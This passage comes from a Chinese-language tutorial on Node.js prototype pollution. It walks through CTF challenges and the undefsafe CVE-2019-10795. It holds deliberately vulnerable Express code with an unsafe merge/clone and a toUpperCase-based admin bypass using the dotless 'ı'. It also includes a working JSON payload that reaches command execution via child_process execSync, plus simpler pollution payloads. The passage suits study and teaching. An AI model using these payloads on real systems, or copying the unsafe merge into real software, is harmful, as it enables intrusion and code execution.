    });
    router.get('/login', function (req, res) {
      res.render('login');
    });
    router.post('/login', function (req, res) {
      if(req.body.Submit=="register"){
       if(safeKeyword(req.body.userid)){
        res.end("") 
       }
        req.session.user={
          'user':req.body.userid.toUpperCase(),    // 变成大写
          'passwd': req.body.pwd,
          'isLogin':false
        }
        res.redirect('/'); 
      }
      else if(req.body.Submit=="login"){
        if(!req.session.user){res.end("")}
        if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
          req.session.user.isLogin=true;
        }
        else{
          res.end("")
        }
      }
      res.redirect('/');
    });
    router.post('/action', function (req, res) {    // /action 路由只能 admin 用户访问
      if(req.session.user.user!="ADMIN"){res.end("")} 
      req.session.user.data = clone(req.body);    // 使用了之前定义的 merge 危险操作
      res.end("");  
    });
    router.get('/info', function (req, res) {
      res.render('index',data={'user':res.outputFunctionName});
    })
    module.exports = router;
源码中用了 `merge()` 和 `clone()`，那必定是原型链污染了。往下找到调用 `clone()` 的位置：
    router.post('/action', function (req, res) {    // /action路由只能admin用户访问
      if(req.session.user.user!="ADMIN"){res.end("")} 
      req.session.user.data = clone(req.body);    // 使用了之前定义的危险的merge操作
      res.end("");  
    });
可见，当我们登上 admin 用户后，便可以发送 POST 数据来进行原型链污染了。但是要污染哪一个参数呢，我们继续向下看到 /info 路由：
    router.get('/info', function (req, res) {
      res.render('index',data={'user':res.outputFunctionName});
    })
可以看到在 `/info` 下，将 res 对象中的 `outputFunctionName` 属性渲染入 `index` 中，而
`outputFunctionName` 是未定义的：
    res.outputFunctionName=undefined;
所以我们就污染 `outputFunctionName` 属性吧。
但是需要admin账号才能用到 `clone()`，于是去到 `/login` 路由处：
    router.post('/login', function (req, res) {
      if(req.body.Submit=="register"){
       if(safeKeyword(req.body.userid)){    // 注册的用户的userid不能是admin
        res.end("") 
       }
        req.session.user={
          'user':req.body.userid.toUpperCase(),    // 变成大写
          'passwd': req.body.pwd,
          'isLogin':false
        }
        res.redirect('/'); 
      }
      else if(req.body.Submit=="login"){
        if(!req.session.user){res.end("")}
        if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
          req.session.user.isLogin=true;
        }
        else{
          res.end("")
        }
      }
      res.redirect('/'); ;
    });
可以看到注册的用户名不能为 admin（大小写），不过有个地方可以注意到：
    'user':req.body.userid.toUpperCase(),
这里将user给转为大写了，这种转编码的通常都很容易出问题，具体请参考 p 牛的文章
[《Fuzz中的javascript大小写特性》](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
我们可以注册一个 `admın`（此admın非彼admin，仔细看i部分）：
> 特殊字符绕过：
>
> **toUpperCase()**
>
> 我们可以在其中混入了两个奇特的字符”ı”、”ſ”。这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() ==
> ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。
>
> **toLowerCase()**
>
> 这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.
注册后成功登录admin用户：
让我们输入自己最喜欢的语言，这里我们就可以发送 Payload 进行原型链污染了：
    {"lua":"123","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"},"Submit":""}
输入后抓包：
并将 Content-Type 设为 application/json，POST Body 部分改为 Json 格式的数据并加上Payload：
然后访问 /info 路由即可得到flag：
###  Nullcon HackIM
再来看看 Nullcon HackIM 中的一个例子：
    'use strict';
    const express = require('express');
    const bodyParser = require('body-parser')
    const cookieParser = require('cookie-parser');
    const path = require('path');
    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
    function merge(a, b) {
        for (var attr in b) {
            if (isObject(a[attr]) && isObject(b[attr])) {
                merge(a[attr], b[attr]);
            } else {
                a[attr] = b[attr];
            }
        }
        return a
    }
    function clone(a) {
        return merge({}, a);
    }
    // Constants
    const PORT = 8080;
    const HOST = '0.0.0.0';
    const admin = {};
    // App
    const app = express();
    app.use(bodyParser.json())    // 调用中间件解析json
    app.use(cookieParser());
    app.use('/', express.static(path.join(__dirname, 'views')));
    app.post('/signup', (req, res) => {
        var body = JSON.parse(JSON.stringify(req.body));
        var copybody = clone(body)
        if (copybody.name) {
            res.cookie('name', copybody.name).json({
                "done": "cookie set"
            });
        } else {
            res.json({
                "error": "cookie not set"
            })
        }
    });
    app.get('/getFlag', (req, res) => {
        var аdmin = JSON.parse(JSON.stringify(req.cookies))
        if (admin.аdmin == 1) {
            res.send("hackim19{}");
        } else {
            res.send("You are not authorized");
        }
    });
    app.listen(PORT, HOST);
    console.log(`Running on http://${HOST}:${PORT}`);
代码很简单，还是使用了 Merge 危险操作，存在原型链污染，因此最简单的 Payload 就是：
    {"__proto__": {"admin": 1}}
## Undefsafe 模块原型链污染（CVE-2019-10795）
不光是 Merge 操作容易造成原型链污染，undefsafe 模块也可以原型链污染。undefsafe 是 Nodejs
的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（<
2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。
###  undefsafe 模块使用
我们先简单测试一下该模块的使用：
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    console.log(object.a.b.e)
    // skysec
可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：
    console.log(object.a.c.e)
    // TypeError: Cannot read property 'e' of undefined
在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题：
    var a = require("undefsafe");
    console.log(a(object,'a.b.e'))
    // skysec
    console.log(object.a.b.e)
    // skysec
    console.log(a(object,'a.c.e'))
    // undefined
    console.log(object.a.c.e)
    // TypeError: Cannot read property 'e' of undefined
那么当我们无意间访问到对象不存在的属性时，就不会再进行报错，而是会返回 undefined 了。
同时在对对象赋值时，如果目标属性存在：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: 'skysec' } } }
    a(object,'a.b.e','123')
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: '123' } } }
我们可以看到，其可以帮助我们修改对应属性的值。如果当属性不存在时，我们想对该属性赋值：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: 'skysec' } } }
    a(object,'a.f.e','123')
    console.log(object)
    // { a: { b: { c: 1, d: [Array], e: 'skysec' }, e: '123' } }
访问属性会在上层进行创建并赋值。
###  undefsafe 模块漏洞分析
通过以上演示我们可知，undefsafe 是一款支持设置值的函数。但是 undefsafe
模块在小于2.0.3版本，存在原型链污染漏洞（CVE-2019-10795）。
我们在 2.0.3 版本中进行测试：
    var a = require("undefsafe");
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'skysec'
            }
        }
    };
    var payload = "__proto__.toString";
    a(object,payload,"evilstring");
    console.log(object.toString);